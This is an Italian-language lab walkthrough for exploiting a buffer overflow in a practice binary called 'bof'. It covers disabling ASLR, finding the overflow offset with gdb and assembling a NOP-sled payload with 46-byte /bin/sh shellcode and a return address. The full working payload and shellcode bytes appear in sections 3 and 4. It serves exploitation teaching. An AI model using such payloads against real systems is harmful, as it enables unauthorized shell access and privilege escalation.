Exploit di Buffer Overflow con Shellcode -------------------------------------
L'obiettivo di questo esercizio è sfruttare una vulnerabilità di buffer overflow per eseguire uno shellcode fornito. Ecco una spiegazione dettagliata di come procedere.

-> 1. Preliminari-------------
Prima di iniziare, ci sono alcune operazioni preliminari da eseguire:

	1 Disabilitare la randomizzazione dello spazio degli indirizzi (ASLR): echo 0 > /proc/sys/kernel/randomize_va_space
		 Questo comando disabilita la randomizzazione dello spazio degli indirizzi, rendendo prevedibili gli indirizzi di memoria.

	2 Assicurarsi che l'eseguibile sia eseguibile: chmod +x ./bof
		
-> 2. Analisi dell'Eseguibile con gdb------------------

	1 Scoprire che l'eseguibile presenta un buffer che prende in input argv1: Eseguire il programma con diversi input per vedere come gestisce i dati.

	2 Tentare un buffer overflow: gdb bof
(gdb) run $(perl -e 'print "A"x622,"BBBB"')

Questo comando riempie il buffer con 622 caratteri 'A' seguiti da 'BBBB'. Se il programma si interrompe con un segmentation fault, significa che il buffer overflow è possibile.

------------------------------	come capire quante A e quante B servono? --------------------------
Per capire quante 'A' e quante 'B' sono necessarie per eseguire con successo un buffer overflow e sovrascrivere l'indirizzo di ritorno di una funzione, puoi seguire questi passaggi: 
	1 Avvia l'eseguibile con gdb: gdb ./bof

	2 Esegui il programma con un input iniziale per vedere se causa un segfault: (gdb) run $(perl -e 'print "A"x100')
		
	3 Incrementa gradualmente il numero di 'A' fino a ottenere un segfault: Continuare a incrementare il numero di 'A' fino a quando non si verifica un segfault. 

Ad ESEMPIO: (gdb) run $(perl -e 'print "A"x200')
(gdb) run $(perl -e 'print "A"x300')
...
-------------------------------------------------------------------------
	3 Individuare il Punto di Sovrascrittura dell'Indirizzo di Ritorno: Quando si ottiene un segfault, usa gdb per esaminare lo stack e determinare dove si trovano le 'A' che causano il segfault. (gdb) x/500xw $esp
		

-> 3. Calcolare la Lunghezza dello Shellcode---------------

	1 Usare Python per calcolare la lunghezza dello shellcode: Questo comando restituisce la lunghezza dello shellcode, che è 46 byte.
python
>>> len(b'\\\\x31\\\\xc0\\\\xb0\\\\x46\\\\x31\\\\xdb\\\\x31\\\\xc9\\\\xcd\\\\x80\\\\xeb\\\\x16\\\\x5b\\\\x31\\\\xc0\\\\x88\\\\x43\\\\x07\\\\x89\\\\x5b\\\\x08\\\\x89\\\\x43\\\\x0c\\\\xb0\\\\x0b\\\\x8d\\\\x4b\\\\x08\\\\x8d\\\\x53\\\\x0c\\\\xcd\\\\x80\\\\xe8\\\\xe5\\\\xff\\\\xff\\\\xff\\\\x2f\\\\x62\\\\x69\\\\x6e\\\\x2f\\\\x73\\\\x68')

----------------------------definizione di SHELLCODE-------------------------------------------- Lo shellcode è un termine utilizzato per indicare codice macchina, spesso scritto in linguaggio assembly, che viene eseguito direttamente da una shell o da un programma senza bisogno di essere incorporato in un file eseguibile tradizionale. Lo scopo principale dello shellcode è di sfruttare vulnerabilità di sicurezza all'interno di un sistema per eseguire operazioni NON autorizzate, come l'esecuzione di comandi dannosi o l'installazione di malware. Lo shellcode viene spesso utilizzato come parte di attacchi informatici, come ad esempio exploit di buffer overflow o altre vulnerabilità software. ---------------------------------------------------------------------------------------------------

-> 4. Preparare il Payload Finale-------------------
	1 Calcolare il numero di NOP: NOP = 626 (A+B) - 4 (B) - 46 (shellcode) = 576

Questo calcolo determina quanti caratteri NOP (in esadecimale \\\\x90) sono necessari.

	2 Cercare l'indirizzo di ritorno: (gdb) run $(perl -e 'print "A"x576,"B"x46,"CCCC"')
(gdb) x/500xw $esp

Questo comando aiuta a trovare l'indirizzo di ritorno. Scegli un indirizzo prima delle 'B', ad esempio 0xffffd230.

	3 Comporre il Payload Finale: (gdb) run $(perl -e 'print "\\\\x90"x576,"\\\\x31\\\\xc0\\\\xb0\\\\x46\\\\x31\\\\xdb\\\\x31\\\\xc9\\\\xcd\\\\x80\\\\xeb\\\\x16\\\\x5b\\\\x31\\\\xc0\\\\x88\\\\x43\\\\x07\\\\x89\\\\x5b\\\\x08\\\\x89\\\\x43\\\\x0c\\\\xb0\\\\x0b\\\\x8d\\\\x4b\\\\x08\\\\x8d\\\\x53\\\\x0c\\\\xcd\\\\x80\\\\xe8\\\\xe5\\\\xff\\\\xff\\\\xff\\\\x2f\\\\x62\\\\x69\\\\x6e\\\\x2f\\\\x73\\\\x68","\\\\x30\\\\xd2\\\\xff\\\\xff"')
	
-> Spiegazione dei Passaggi del Payload:

	1 NOP Sled: "\\\\x90"x576

Una lunga serie di istruzioni NOP (No Operation). Questo permette allo shellcode di essere eseguito anche se l'indirizzo di ritorno non è preciso.

	2 Shellcode: "\\\\x31\\\\xc0\\\\xb0\\\\x46\\\\x31\\\\xdb\\\\x31\\\\xc9\\\\xcd\\\\x80\\\\xeb\\\\x16\\\\x5b\\\\x31\\\\xc0\\\\x88\\\\x43\\\\x07\\\\x89\\\\x5b\\\\x08\\\\x89\\\\x43\\\\x0c\\\\xb0\\\\x0b\\\\x8d\\\\x4b\\\\x08\\\\x8d\\\\x53\\\\x0c\\\\xcd\\\\x80\\\\xe8\\\\xe5\\\\xff\\\\xff\\\\xff\\\\x2f\\\\x62\\\\x69\\\\x6e\\\\x2f\\\\x73\\\\x68"

Questo è il codice macchina che esegue una shell.

	3 Indirizzo di Ritorno: "\\\\x30\\\\xd2\\\\xff\\\\xff"

Questo è l'indirizzo di memoria a cui il programma salta dopo l'overflow del buffer, puntando verso l'inizio della NOP sled.
NB: ricordiamoci che l'architettura è little endian quindi va scritto al contrario!

------------------------per trasfromare l’indirizzo da esadecimale a formato \x	 L'indirizzo 0xffffd230 diventa \\\\x30\\\\xd2\\\\xff\\\\xff
	


